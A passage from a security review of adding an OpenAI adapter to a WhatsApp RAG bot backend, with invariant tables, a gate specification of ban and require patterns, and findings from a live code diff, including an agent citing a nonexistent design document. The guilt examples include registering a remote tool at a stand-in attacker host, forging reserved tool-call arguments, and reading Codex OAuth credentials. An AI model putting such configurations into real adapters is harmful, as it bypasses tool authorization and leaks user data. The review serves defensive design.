| **Provider-selection / fallback semantics (NEW ROW, added post-refutation, corrected to name the LIVE third provider)** | Two committed-on-`origin/main` OpenRouter surfaces: `llm_gateway.py`'s direct `_call_openrouter` (`OpenRouterClient`, imported `:65`), gated by `settings.openrouter_enabled` (`config.py:130`, default `False`); and `provider_registry.py`'s `OpenRouterProvider` (unresolved whether it has a production caller — see Reader's contract). Either way, OpenRouter — a multi-vendor router that can itself serve OpenAI models — is **not a future risk this PR introduces; it is a live, config-gated fallback ALREADY on main today** | The most likely way an OpenAI adapter gets wired in practice is by **imitating the ALREADY-PRESENT `_call_openrouter` fallback block** rather than the "shadow-only, explicit flag" design this document assumes — a Gemini quota exhaustion (already happened 4× per the corner) flips traffic to a fallback with nobody making a discrete "arm OpenAI" decision, exactly as `openrouter_enabled` already can today for a different vendor. This document's invariant table had NO row for "which provider answered, and who authorized that routing decision" before this correction, and none of §a's F1-F8/A1-A5 named OpenRouter's key hygiene until F8/A5 above | A test asserting the response schema/log always names WHICH provider answered (§Gate V2 G10 already requires schema identity; add: the provider-identity field must be present and asserted in an integration test that actually exercises the OpenRouter/fallback branch TODAY, not just the OpenAI-hypothetical case) |
| **Routing / SENSITIVE_TOOLS (`crm_query`/`timesheet`/`team_knowledge`)** | `tool_authorizer.py:84` `SENSITIVE_TOOLS = frozenset({"crm_query", "timesheet", "team_knowledge"})`, denied when `agent_role is None` (`:235`); P0-ID (§3 spec) already flags the WA principal as forgeable via the shared `X-Internal-Key` | If the OpenAI adapter is wired as an ALTERNATE model behind the SAME `agentic_rag.py` orchestration (the sane design), this invariant is unaffected — `tool_authorizer.authorize()` runs regardless of which LLM chose to call the tool. The risk is only if a "quick OpenAI pilot" bypasses the orchestrator and calls tools directly from adapter code to avoid refactoring — that would skip `authorize()` entirely | A test that asserts every tool-call in the OpenAI adapter's execution path round-trips through `tool_authorizer.authorize()` — i.e. `execute_tool`/`tool_executor.py`'s existing call graph, not a parallel dispatcher |
| **Reserved-arg forgery (P0-ARG)** | `tool_executor.py:42` `_strip_reserved_args`, called `:315` (before authorization) and `:450` (defense-in-depth, before execution) — strips `_caller_profile`/`_user_id` etc. from LLM-supplied tool-call arguments | OpenAI's Responses API tool-call argument shape is a **different JSON structure** than Gemini's function-calling shape (`genai_client.py` types) — if the adapter's argument-extraction code parses OpenAI's shape into a dict and hands it DIRECTLY to `tool.execute(**arguments)` without routing through the SAME `_strip_reserved_args` call, the P0-ARG fix (already shipped for Gemini) simply does not apply to the new path — reintroducing a closed P0 via a new code path is a a real and cheap-to-miss failure mode here | A test that feeds a synthetic OpenAI tool-call payload containing `_caller_profile`/`_user_id` keys through the FULL adapter→executor pipeline and asserts they never reach `tool.execute()` — same guilt+innocence shape as the existing P0-ARG test, re-run against the new entry point |
| **Rate/length cap on inbound (P0-FLOOD)** | `ChannelRateLimiter` exists, per spec §3 unwired to WA ingress at all (pre-existing gap, not new) | Orthogonal to the provider choice — noted only because a NEW provider with its OWN per-token billing makes an unthrottled inbound flood a **direct cost exposure** in a way Gemini's prepay-credit model (already depleted 4x, per corner) does not fully capture; a flood against a metered OpenAI key is dollars leaving an account in real time, no prepay buffer | Not this lane's fix (P0-FLOOD is tracked in the spec's W-1); flagged here so V3 (failure matrix) inherits it as a MUST-HAVE precondition before any OpenAI path goes above shadow-traffic volume |
| **Audit / no PII in logs** | `tool_authorizer.py::_audit` logs `user=%s` from `user_email`; on WA, `user_id = whatsapp_<phone>` (corner: "P0 — PII log leak … cure in flight") — this is a KNOWN, not-yet-fully-closed defect on the Gemini path today | A new OpenAI adapter that adds its OWN logging (e.g. an OpenAI SDK request/response logger, or a Langfuse OpenAI-specific trace with `hide_input_messages` not set the same way the Gemini path defaults it) reintroduces the SAME PII-in-logs shape a second time, in a code path the existing fix doesn't cover | A test that the new adapter's logging calls (`logger.info`/`.debug`/tracing spans) never interpolate `user_id`/`phone`/`query` raw — reuse `sentry_config.py::_before_send`'s `_PII_KEY_SUBSTRINGS` pattern-matching approach rather than hand-writing a new redaction list |
| **Human handoff (`BotStandingCondition`, `_tell_a_human`, `human_reason`)** | `wa_inbox_bot.py:208-272` — single choke point, 3-of-5 raise sites call it (§1 corner, 2026-08-12 fix) | This invariant lives ENTIRELY in `wa_inbox_bot.py`, which calls the orchestrator over HTTP and only inspects the RESPONSE JSON (`abstain`, `answer`, `context_length`, `evidence_score`). It is provider-agnostic BY CONSTRUCTION as long as the OpenAI adapter's HTTP response shape matches the EXISTING `/api/agentic-rag/query` response contract exactly (same field names, same semantics for `abstain`/`context_length`/`evidence_score`) — the risk is a response-shape drift, not a logic bypass | A schema test: OpenAI-path responses from `/api/agentic-rag/query` validate against the SAME response model/schema Gemini-path responses do — one endpoint, one contract, provider is an internal implementation detail never visible in the response shape |

---

## (c) Failure surface

Out of scope for this document by the mandate — handed to task V3 (Failure matrix + idempotency +
rollback proof). Noted here only as a pointer so V3 does not have to re-derive it: the **rollback
target** V3 needs to prove against is `genai_client.py::GenAIClient.__init__` (`L388-452`) — Gemini
selection is driven entirely by `settings.google_api_key`/`google_imagen_api_key` plus an optional
Vertex-vs-AI-Studio branch, i.e. genuinely config-only for the Gemini SIDE of a rollback. The harder
half V3 must prove, which this document flags but does not solve: `LLMGateway`'s tier constants
(`TIER_FLASH`/`TIER_LITE`/`TIER_PRO`/`TIER_FALLBACK`, `llm_gateway.py:76-79`) and its whole fallback
cascade are Gemini-shaped, so "rollback config-only" is true for TURNING OFF the Gemini call, but
whether it is ALSO true for turning the OpenAI call back off (i.e. whether the OpenAI adapter is a
strict ADDITION behind the same interface, vs. a fork that changed the interface) is exactly the
question V3's idempotency section needs to answer with a real diff, not an assumption.

## (d) Supply chain

- **SDK**: `openai` Python package. Already a transitive/direct dependency (10+ existing call sites
  import `from openai import AsyncOpenAI`) — no NEW dependency to vet, but pin discipline still
  applies: check `requirements.txt`/lockfile for the currently-pinned `openai` version against the
  Responses API's minimum SDK version requirement before building against it (Responses API landed
  in `openai-python` ≥1.x with `client.responses.create`; an old pin silently lacks the method).
- **`ANTHROPIC_API_KEY` — reaffirmed, not re-derived**: zero occurrences permitted anywhere in the
  new adapter, its tests, its config, or its docs. This is CLAUDE.md §5's existing hard ban;
  restated here only because "we just built a paid-API adapter for provider X" is exactly the kind
  of PR that invites "let's make the pattern generic" scope creep toward provider Y = Anthropic.
- **Version drift risk specific to Responses API**: OpenAI's Responses API is newer and evolves
  faster than Chat Completions; a version pin that's fine today can silently change tool-calling
  JSON shape on a minor bump. The gate spec (G7 below) should include a schema-snapshot test that
  fails loud on an unexpected shape change, rather than silently degrading (mirrors the existing
  `generate_structured` retry-once-then-fallback pattern in `apps/backend-rag/CLAUDE.md`'s LLM
  Structured Output Pattern section).
- **CORRECTED post-refutation**: "no NEW dependency to vet" (above) is true but incomplete on its
  own — the `openai` SDK version bump the Responses API needs is the SAME package `embeddings.py`
  (the FROZEN `text-embedding-3-small` embedder, CLAUDE.md §9) and `audio_service.py` already
  import. A version bump for the new adapter's benefit changes retry/timeout/serialization
  behavior under the ONE path this repo freezes hardest against, with no invariant row anywhere
  protecting it. Any pin bump for this PR needs a regression pass on the embedder specifically, not
  just "does the Responses client's own tests pass."

---

## §Gate V2 spec

Dry list — pattern to ban/require + the contract test that proves it, guilt+innocence example for
each (scar-family #3: no guard ships without both). These are specs for the NEXT lane to implement,
not implemented here.

| id | Pattern (ban / require) | Guilt example (must trigger) | Innocence example (must NOT trigger) |
|---|---|---|---|
| G1 | BAN: any import/usage suggesting a ChatGPT/Codex OAuth-session credential in a Fly-deployed backend module (`~/.codex/auth.json`, `CODEX_HOME`, `codex exec`/`codex login` subprocess, cookie-jar file reads for `chat.openai.com`) | `subprocess.run(["codex", "exec", "-m", ..., prompt])` inside `backend/services/integrations/` | The SAME string appearing in a `research/operations/*.md` doc describing the ban, or in `scripts/` tooling that is explicitly a LOCAL dev/ops helper never deployed to Fly (must be entity-scoped to "is this file part of the Fly deploy image", not a bare grep for the word `codex`) |
| G2 | BAN: `OPENAI_API_KEY`/new adapter's secret used by more than one settings-consumer at once (secret-reuse, F7) | `embeddings.py` and the new WA adapter both reading `settings.openai_api_key` | The new adapter reading a DISTINCT `settings.openai_wa_provider_api_key` field while `embeddings.py` keeps reading `settings.openai_api_key` unchanged |
| G3 | REQUIRE: every OpenAI tool-call argument dict passes through `_strip_reserved_args` before `tool.execute()` | A new `openai_tool_executor.py` (hypothetical) that calls `tool.execute(**arguments)` directly from parsed OpenAI JSON | The same call routed through the EXISTING `tool_executor.execute_tool()` entry point, which already calls `_strip_reserved_args` at `:315`/`:450` |
| G4 | REQUIRE: every OpenAI tool-call passes through `tool_authorizer.authorize()` | A direct `if tool_name == "crm_query": crm_service.query(...)` shortcut inside adapter code | The call going through `orchestrator`'s existing dispatch, which already calls `authorize()` |
| G5 | BAN: OpenAI-native retrieval/browsing tools (`web_search`, `file_search`) registered in the adapter's tool schema. **UNDER-MATCH, confirmed post-refutation via WebSearch against OpenAI's own docs (`developers.openai.com/api/docs/guides/tools`)**: the Responses API also ships a built-in `mcp` tool type (remote Model Context Protocol server calls — arbitrary third-party endpoints, a complete `tool_authorizer` bypass AND an uncontrolled data-egress channel, strictly worse than web search), plus `image_generation`/`computer_use_preview`/whatever ships next. A negative enumeration of a tool list this document's own §(d) says "evolves faster than Chat Completions" is guaranteed to lag — **use G16 (positive allowlist) as the actual gate; G5 is retained only as the guilty-example half of that pattern** | `tools=[{"type": "web_search"}]` OR `tools=[{"type": "mcp", "server_url": ...}]` passed to `client.responses.create(...)` | `tools=[{"type": "function", "function": {"name": "crm_query", ...}}]` — a repo-defined function tool, schema-identical to what the Gemini path already exposes |
| G6 | REQUIRE: OpenAI adapter's `sources`/citation output normalizes to the SAME `{source_ref, source_date, ...}` dict contract as `NotebookLMCacheService.set()` before reaching `_normalize_citations` | Adapter returns `sources: ["Perpres 10/2021 art 6"]` (bare strings) | Adapter returns `sources: [{"source_ref": "...", "source_date": "...", ...}]` |
| G7 | BAN (over-match guard, scar #3): a naive "no `AsyncOpenAI` anywhere in a conversational path" regex that also flags the EXISTING embeddings/voice usage | A CI rule matching bare `from openai import` anywhere under `backend/` | A rule scoped to the NEW adapter's module path specifically (e.g. `backend/services/integrations/wa_openai_provider*.py`), leaving `embeddings.py`/`audio_service.py` untouched |
| G8 | REQUIRE: adapter's logging/tracing calls never interpolate raw `user_id`/`phone`/free-text `query` — reuse `sentry_config.py`'s `_PII_KEY_SUBSTRINGS` list rather than a fresh one | `logger.info(f"OpenAI call for {user_id}: {query}")` | `logger.info("OpenAI call for thread %s", thread_id)` (opaque id, no phone/query) |
| G9 | REQUIRE: the adapter has zero direct cache-write call sites outside `NotebookLMCacheService.set()` | `redis_client.set(f"answer:{query_hash}", openai_answer)` inside adapter code | Adapter returns the answer to the orchestrator, which (unchanged) decides whether/how to cache it via the existing service |
| G10 | REQUIRE: `/api/agentic-rag/query` response schema is IDENTICAL (same Pydantic/dataclass model) regardless of which provider answered — no provider-specific response fields leak to `wa_inbox_bot.py` | A new `openai_tool_calls_raw` field appearing in the JSON `wa_inbox_bot.py` parses | The response validating against the existing `CoreResult`/response model unchanged |

---

## §Live diff review (implementer worktree `.worktrees/bot-openai-adapter`, branch `agent/air-m5/bot/openai-adapter`)

The orchestrator forwarded a list of concrete risks observed in the real implementer diff mid-session.
Every item below was independently re-verified against the actual files in that worktree THIS turn
(not taken on the orchestrator's word — W65 applies to a coordinator's report exactly as it applies to
a refuter's). Diff touches: `apps/backend-rag/backend/app/core/config.py` (+41),
`apps/backend-rag/backend/services/rag/agentic/llm_gateway.py` (+25),
`apps/backend-rag/backend/llm/openai_responses_client.py` (new, 372 lines),
`apps/backend-rag/backend/services/rag/agentic/_shadow_provider.py` (new, 176 lines),
`scripts/bot/build_deid_corpus.py` (new, not reviewed here — out of scope for V1).

### 🔴 Finding 0 (found independently, confirmed first-hand by the coordinating lane) — the governing document does not exist

**FIRST item, per coordinating-lane instruction, with the exact evidence re-verified this turn.**
Six files in the implementer worktree cite
`research/operations/2026-08-15-adr-wa-runtime-openai-provider.md` as the authority for design
decisions — all six checked via `grep -rn "adr-wa-runtime-openai-provider" apps/backend-rag/backend
scripts` in that worktree, this turn:

| File | Line | What it cites the ADR for |
|---|---|---|
| `apps/backend-rag/backend/llm/openai_responses_client.py` | `:5` | module authority, "see …ADR…" |
| `apps/backend-rag/backend/app/core/config.py` | `:133` | "mandate `…ADR…`" comment on the new fields |
| `apps/backend-rag/backend/services/rag/agentic/llm_gateway.py` | `:533` | authority for the shadow-dispatch insertion point |
| `apps/backend-rag/backend/services/rag/agentic/_shadow_provider.py` | `:26` | "§Non-goals records this as …" — quotes a section of the ADR that cannot be checked |
| `scripts/bot/build_deid_corpus.py` | `:6` | "Part of the … shipping mandate … `…ADR…`" |
| `scripts/bot/wa_blind_bench.py` | `:6` | same, plus cites `build_deid_corpus.py` as its own input |

**The ADR file does not exist anywhere**: not in this worktree, not in any other bot-lane worktree,
not in `git log --all --diff-filter=A` for that exact path across every ref (re-run this turn, zero
hits), not in a commit-message grep for `adr-wa-runtime` (zero hits). One quoted example:
`_shadow_provider.py`'s docstring quotes an Italian sentence in quotation marks as if copied
verbatim from the ADR's §Non-goals — a section of a document that isn't on disk.

**Status update on `scripts/bot/wa_blind_bench.py`, checked this turn**: an earlier pass of this
review found it absent (zero results anywhere in the tree). As of this later check, the file now
exists on disk in the implementer worktree — `git status --short` there shows it **untracked** (`??
scripts/bot/`), i.e. still not committed to that branch's history, and it too cites the same
nonexistent ADR (`:6`, table above). This does not weaken Finding 0 — the governing document is
still phantom, and the citing surface grew, not shrank, between the two checks. Flagged as a live
sibling: this file belongs to the implementer lane and was NOT read, edited, or otherwise touched by
this review beyond the one `grep`/`git status` used to establish this fact.

**This is scar family #6 (anti-hallucination blindness / phantom citations), and it is the sharpest
finding in this review**: every design decision in the diff — "Responses API not Chat Completions",
"shadow receives the same assembled context", "no model has been benchmarked yet", the T2/T3 VIETATO
list — is attributed to a document that cannot be checked against. A verifier cannot confirm the diff
satisfies a mandate that isn't on disk; a reader six months from now cannot either. Before this PR is
mergeable, the ADR needs to actually exist (written and committed, even retroactively as "the
decisions this PR encodes"), or every citation to it needs to come out and the reasoning needs to
stand on its own in the docstrings. **This is a veto-strength finding, not a stylistic nit** — the
coordinating lane's own independent, first-hand verification of the six-file citation pattern above
confirms it; the formal veto on the implementer's eventual PR is carried there via required review,
citing this artifact, not via a direct message to that lane (coordination channel per Zero's
standing order: artifacts/PRs only, no direct cross-lane messaging).

**STATUS UPDATE, verified independently this turn (not taken on team-lead's word — re-checked via
`git log`/`git show`/`git diff --stat` in the implementer worktree directly): the ADR is no longer
phantom.** Committed at `a2201e958` ("docs(bot): ADR for OpenAI Responses client (NO-WIRING) +
SKILL.md correction") and finalized at `986a29280`; 371 lines, tracked, working tree clean. This
document's veto is NOT lifted by that alone — a committed ADR retires the "authority doesn't exist"
half of Finding 0, but the OTHER half (does the code actually implement what the ADR claims to
mandate?) has not been checked in this pass and is exactly what the freeze re-review below must do.
Do not read "the ADR exists now" as "Finding 0 is closed" — it converts from a phantom-citation veto
into an ordinary ADR-compliance review, which still has to happen.

### Orchestrator-supplied risks — verified

| # | Claim | Verified? | Evidence |
|---|---|---|---|
| 1 | Reuses `OPENAI_API_KEY` already used for embeddings, despite the council condition for a dedicated least-privilege service identity | **CONFIRMED, but self-disclosed, not hidden** | `openai_responses_client.py:14-28` — the module's OWN docstring names this exact collision ("IDENTITY/BILLING COLLISION — FLAG FOR ZERO, NOT SILENTLY RESOLVED") and says explicitly "Do not treat `available=True` as proof the identity/billing-separation term is satisfied." `_ENV_VAR = "OPENAI_API_KEY"` (`:81`) is the same setting name `embeddings.py:248/271` reads. The code names the risk and does not fix it — matches Gate V2 pattern G2 exactly. The self-disclosure is a mitigating factor for THIS PR (nobody can claim they weren't told) but does nothing once `OPENAI_SHADOW=true` is actually armed — see Finding 6. |
| 2 | Responses payload lacks `store:false` and exposes `previous_response_id` (provider-side state) | **STALE — CORRECTED this turn, per team-lead's first-hand catch.** This finding was true of an EARLIER pass of the implementer's working tree and is **FALSE of the current state**, re-verified this turn (`Read` on `openai_responses_client.py`, lines quoted below). Kept in this table, struck-through in substance, so the record shows what was found AND that it was fixed/moved on — not silently deleted (W113 discipline: the replacement claim is itself verified, not assumed). | **Current code** (`openai_responses_client.py:287-336`, re-read this turn): the docstring at `:296-306` now states *"STATELESS ONLY for this phase (orchestrator veto 2026-08-15 point 2): every request sends `"store": false"* and the payload builder at `:325-331` sets `"store": False` **unconditionally**, on every call, with no code path that omits it. `previous_response_id` is **no longer a parameter of `generate()` at all** — removed entirely, not merely unused (the docstring says "there is no `previous_response_id` parameter"). **This does not mean the underlying risk this row describes is retired** — it means the CURRENT snapshot has addressed it; the risk is exactly why G11 exists as a **tripwire against regression** (§Gate V2 below), not as a still-open finding. Because the implementer worktree is uncommitted and moving (see snapshot header), this must be re-checked again at freeze — do not carry "fixed" forward as a fact about the eventual PR without re-reading the frozen diff. |
| 3 | `DEFAULT_MODEL=gpt-5.1` placeholder instead of a benchmarked model | **STALE — CORRECTED, and now fully closed** (traced this turn, was previously deferred). `DEFAULT_MODEL` is no longer `"gpt-5.1"`, AND the value it now resolves to is a real, documented OpenAI model. | **Current code**: `MODEL_TERRA = "gpt-5.6-terra"` (`openai_responses_client.py:136`), `DEFAULT_MODEL = MODEL_TERRA` (`:138`). **Verified this turn against the primary source** (`https://developers.openai.com/api/docs/models`, fetched fresh by a dispatched verification fork): `gpt-5.6-sol`, `gpt-5.6-terra`, and `gpt-5.6-luna` are all real, documented OpenAI model IDs, each supporting the Responses API (`v1/responses`) — `gpt-5.6-terra` is described there as "balances intelligence and cost." The original concern ("nobody verified the default is a real model") is retired for real, not cosmetically. Noted for the record: the Kimi K3 adversarial pass on this document independently re-raised this exact question and concluded the OPPOSITE — that `"gpt-5.6-terra"` "carries this fleet's internal Codex-family codename ('Terra', per `FLEET_TOPOLOGY.json` role naming) as a suffix" and "matches no documented OpenAI model naming scheme." That objection is **reviewer error, refuted by the primary source above** — see `## Adversarial review` for the full writeup. Kimi's instinct (a fleet-internal codename colliding with a real vendor slug is exactly the kind of thing worth flagging) was sound; the conclusion was wrong once actually checked against OpenAI's docs rather than against naming-pattern intuition. |
| 4 | "Available" docs claim live env but the key is cached at construction | **STALE — CORRECTED this turn.** The docstring/behavior mismatch this row described no longer exists in the current snapshot. | **Current code** (`openai_responses_client.py:259-264`, re-read this turn): the `available` property docstring now reads *"True only when an API key is configured, **re-checked on every access** (see `_resolve_api_key`) — mirrors `OpenRouterProvider.is_available` reading `settings.openrouter_enabled` at call time (COS-LAW-013), not once at import/construction"* and the body is `return bool(self._resolve_api_key())` — a live call, not a cached attribute read. The docstring/behavior pair is now internally consistent, and it explicitly cites the OpenRouter precedent (A5 above) as the pattern it's matching. Re-verify `_resolve_api_key()` itself at freeze (not done in this pass) to confirm it genuinely re-reads the source each call rather than memoizing one level down. |
| 5 | Shadow receives only current message/system prompt, drops chat history/`conversation_messages`/tools, and dispatches on every ReAct gateway call — so the ADR's "same assembled context" claim is false | **STALE — the code this finding describes is DELETED.** This was CONFIRMED and accurate at the time it was written, against the shadow-provider design that then existed. The rework commit (`b36fc9521`, "Rework of the vetoed shadow-provider design... zero wiring into any live path") removed `_shadow_provider.py` entirely and the `llm_gateway.py` shadow-dispatch call site along with it — confirmed independently this turn by the Kimi K3 adversarial pass (live `git`/`grep` in the implementer worktree) and by a separate verification fork. The context-parity DEFECT this row documents (missing history, missing tools) is a real historical finding about a design the implementer already discarded before this correction landed — it should NOT be carried forward as a property of the current or eventual frozen diff without re-checking the reworked, standalone client. | ~~`llm_gateway.py::send_message()` signature (`:414-424`)... `_shadow_provider.py`'s own docstring (`:4-11`)...~~ (original evidence retained below for the historical record; do not re-cite as current) | `llm_gateway.py::send_message()` signature (`:414-424`): `message: str` is documented as *"User message or continuation prompt"* — the CURRENT turn only; conversation history lives server-side in the Gemini `chat` `ChatSession` object (built by `_get_or_create_chat_session`, converts `history_to_use` into Gemini's own history format at session-creation time, not re-sent per call); `conversation_messages` is a SEPARATE parameter used only for the OpenRouter fallback path. The shadow dispatch call (`:527-535`) passes exactly `message=message, system_prompt=system_prompt, primary_model=model_used, primary_text=text_content, primary_latency_ms=latency_ms` — no `conversation_messages`, no `gemini_tools`. `_run_shadow` (`:132-149`) forwards only `input_text=message, system_prompt=system_prompt` to `client.generate()` — **no `tools=` at all**, so even if a ReAct step's Gemini call used function-calling, the shadow twin cannot call any tool and answers blind. `_shadow_provider.py`'s own docstring (`:4-11`) quotes the ADR as saying the shadow branch "riceve LO STESSO contesto già assemblato dall'orchestratore" — **demonstrably false as coded**. And yes, `send_message()` is the gateway's single call site for every LLM turn in the ReAct loop (WA bot caps at `max_steps=2`, per `wa_inbox_bot.py:530` — so up to ~2-3 dispatches per user message, not one), confirming "dispatches on every ReAct gateway call." Net effect: even once armed, any comparison this shadow logs is confounded by (a) missing history — the OpenAI side answers a DIFFERENT, poorer-context question than Gemini did, and (b) missing tools — a tool-using Gemini turn has no fair OpenAI counterpart at all. Whatever `wa_blind_bench.py` (Finding 0: also phantom) was meant to score, it cannot score model quality from this data without first correcting for context parity. |
| 6 | Unreferenced `asyncio.create_task`, no task drain/limit | **STALE — same reason as row 5.** `_shadow_provider.py` (the file this finding's evidence cites) is deleted in the rework commit. Historical, not current. | `_shadow_provider.py:121-129` — `loop.create_task(_run_shadow(...))` with the returned `Task` object never assigned to any variable, never stored in a set/registry, never awaited anywhere. This is the exact anti-pattern the Python `asyncio` docs warn about explicitly: an unreferenced task can be garbage-collected mid-execution with no error surfaced (CPython does not guarantee the task survives if nothing holds a strong reference, particularly under GC pressure). There is also no concurrency cap analogous to `wa_inbox_bot.py`'s `_bot_generation_semaphore` (`_get_bot_generation_semaphore`, admission-gates the PRIMARY Gemini calls at `WA_BOT_MAX_CONCURRENT_GENERATIONS`, default 3) — nothing bounds how many shadow tasks can be in flight at once if traffic scales while the flag is armed, which is a direct cost-exposure risk given OpenAI billing is metered per-token with no prepay buffer (mirrors this document's §(b) P0-FLOOD row, but for the shadow branch specifically, which the original P0-FLOOD analysis didn't cover because it didn't exist yet). |
| 7 | `OPENAI_SHADOW` + a key present is sufficient to send raw conversational content — no independent legal/privacy arming gate | **STALE — same reason as rows 5/6.** `OPENAI_SHADOW`/`maybe_dispatch`/`_shadow_provider.py` are gone from the current tree; this was the single most important finding in the earlier design and its removal is a genuine improvement, but the finding itself no longer describes live code. The UNDERLYING RISK CLASS this row names (a design that arms real-traffic dispatch on nothing but a bool flag + a configured key, with zero DPA/consent/ZDR gate) is exactly what §Freeze re-review item (d) and the fence-compliance check below must re-verify does NOT reappear if/when this adapter is eventually wired into a live path — the row is retired as a current finding, not as a category to keep watching. | `maybe_dispatch()`'s only precondition (`_shadow_provider.py:98-113`) is `settings.openai_shadow_enabled` (a bare bool env flag) plus `client.available` (a configured key — see Finding 4 for how that check can itself be stale). There is **no check anywhere in this code path** for: a DPA being signed, ZDR/MAM proof (Deliverable 2 §2.1), per-client consent capture (CLAUDE.md §14 / C16), or even a "shadow corpus is synthetic/de-identified only" guard — `message`/`system_prompt` are whatever the live orchestrator assembled for THIS request, i.e., real client free-text when the flag is flipped on real traffic. Deliverable 2 §3.3 says "do not authorize real client traffic based on this document alone" as a POLICY statement; this diff shows that policy currently has **zero code-level enforcement** — the only thing standing between "flag is off" and "every WA message's current turn is sent to OpenAI" is the env var default. Recommend (for V2's gate spec, not implemented here): a SEPARATE, explicit "shadow corpus policy" check — e.g. an env-gated allowlist of session/thread markers known to be synthetic/de-identified (mirrors `scripts/bot/build_deid_corpus.py`'s existence, unread in this pass) — before `OPENAI_SHADOW=true` is ever considered safe to set in the SAME environment that serves real client traffic, or a hard requirement that shadow only run in a non-prod environment until Deliverable 2 §3.2's preconditions are dated artifacts. |

### New Gate V2 patterns from this review

| id | Pattern | Guilt example | Innocence example |
|---|---|---|---|
| G11 | **REGRESSION TRIPWIRE, not a current defect** — confirmed already satisfied in the implementer's unfrozen working-tree snapshot as of 2026-08-15 (session verification: `openai_responses_client.py:325-331` sets `"store": False` unconditionally, and `previous_response_id` is no longer a `generate()` parameter at all). Re-verify at freeze. REQUIRE: every OpenAI Responses API payload explicitly sets `"store": false` unless a specific, reviewed feature (e.g. multi-turn `previous_response_id` chaining) is intentionally using provider-side state, in which case the retention consequence must be named in the SAME commit's docstring/ADR | `payload = {"model": ..., "input": ...}` with no `store` key | `payload["store"] = False` set unconditionally, or set `True` only behind a second, explicitly-named flag with its own docstring justifying the retention tradeoff |
| G12 | REQUIRE: any module-level singleton client whose `.available`/readiness docstring claims "read live" must actually re-read its source (env/settings) on each check, or the docstring must say "cached at construction, restart to pick up a new key" — the two must never disagree | `available` property returns a value cached in `__init__` while its docstring claims live reads | `available` calls `os.getenv(...)` inline, or the docstring is corrected to state the cached behavior |
| G13 | REQUIRE: every `asyncio.create_task(...)` for fire-and-forget work is stored in a module-level tracked set (`_background_tasks.add(task); task.add_done_callback(_background_tasks.discard)` — the standard pattern) and bounded by a concurrency-limiting primitive (semaphore or explicit queue depth cap) | `loop.create_task(coro())` with the return value discarded, no cap | Task stored in a tracked set with a done-callback AND a semaphore gating how many can run concurrently |
| G14 | REQUIRE: a shadow/comparison branch that claims "receives the same assembled context as the primary" is tested against a fixture that WOULD FAIL if history or tool schema were silently dropped — i.e. a contract test comparing exactly what fields the primary call site builds vs. what the shadow dispatch call forwards | A test that only checks `maybe_dispatch` doesn't raise when called | A test that constructs a `send_message()` call with non-trivial `conversation_messages`/`gemini_tools`, captures what `maybe_dispatch` was invoked with, and asserts those fields are present and non-empty when the primary call included them |
| G15 | BAN: citing a `research/operations/*.md` "ADR"/"shipping mandate" document (with quoted text, section numbers, or a VIETATO list attributed to it) that does not exist on disk at merge time | A docstring quoting `research/operations/2026-08-15-adr-*.md` when `find`/`git log --all` return zero hits for that path | The same docstring after the ADR file has actually been committed, or after the citation is replaced with self-contained reasoning that doesn't depend on an external document |
| G16 | REQUIRE (replaces the negative half of G5): a **positive allowlist** — every tool in the adapter's `tools=[...]` payload is `type == "function"` AND its `name` ∈ the repo's existing `_gemini_tools` enumeration. Verified via WebSearch this turn: OpenAI's own built-in tool types (`web_search`, `file_search`, `mcp`, `image_generation`, `computer_use_preview`, and whatever ships next) are NOT enumerable in a stable ban-list against a fast-moving API — a positive filter is immune to new tool types shipping upstream | `tools=[{"type": "mcp", "server_url": "https://attacker.example/mcp"}]` passes an enumerated-ban check written before `mcp` existed | `tools=[{"type": "function", "function": {"name": t}} for t in EXISTING_TOOL_NAMES]` — every entry checked against the SAME allowlist Gemini's tool schema uses |
| G17 | REQUIRE: the OpenAI HTTP client's `base_url` is pinned to `https://api.openai.com` (or an explicit, reviewed exception with its own justification) — verified this turn that this repo already points `AsyncOpenAI` at non-OpenAI `base_url`s for DeepSeek/Ollama (`observability.py:213-221`), so endpoint redirection is idiomatic here, not exotic, and G1's literal-pattern ban does not catch `AsyncOpenAI(base_url="https://chatgpt.com/backend-api/...", api_key=os.environ["ANY_VAR"])`. Combine with a deploy-time check that `OPENAI_WA_PROVIDER_API_KEY` and `OPENAI_API_KEY` (embeddings) hold DIFFERENT values, not just different settings-field names (closes G2's value-level reuse gap) | `AsyncOpenAI(base_url="https://some-proxy.example/v1", api_key=...)` inside the new adapter, or the adapter reading `os.environ["OPENAI_API_KEY"]` directly instead of the dedicated `settings.openai_wa_provider_api_key` field | `AsyncOpenAI(base_url="https://api.openai.com/v1", api_key=settings.openai_wa_provider_api_key)` — pinned host, dedicated settings field, non-empty and distinct-value check against `settings.openai_api_key` in a startup assertion |
| G18 | REQUIRE: `getattr(state, "trusted_tools_used", True)` (`orchestrator_streaming_core.py:378`) fails CLOSED, not open — a `state` object missing the attribute must resolve to `trusted_tools_used=False`, not `True`. Verified this turn: `apply_shared_trusted_flippers` is a pass-through and `detect_trusted_tool_usage` computes the real signal from the executed-steps trace, provider-agnostic — so this default is a pure omission bug, not an OpenAI-specific gap, but a NEW adapter path is exactly the kind of code that can construct `state` without ever touching this field. **CAVEAT added post-Kimi-K3-review (ACCEPTED, see `## Adversarial review`)**: `orchestrator_streaming_core.py:378` is committed code on `origin/main` serving the CURRENT Gemini live path, not part of the OpenAI adapter's diff — flipping this default is a behavior change to production traffic, not a scoped addition, and this document never verified that every existing Gemini-path construction of `state` already sets the attribute before this line reads it. Before this gate is required as a merge-blocking condition on the OpenAI PR specifically, the BUILD lane (or a separate, dedicated PR) must first audit every live `state`-construction site on the Gemini path and confirm none of them rely on the `True` default — otherwise flipping it silently tightens abstention for the EXISTING provider, which is exactly the "rogue AI refactor changes live semantics" class this repo's pre-deploy checklist exists to catch. Recommend splitting G18 into its own PR/finding, independent of and not blocking the OpenAI adapter's freeze | A new/refactored code path builds `state` and never sets `trusted_tools_used`; `getattr(..., True)` silently reads "confident" | The default flips to `False`; a path that legitimately trusts a tool result sets the attribute explicitly (as the existing ReAct loop already does) |
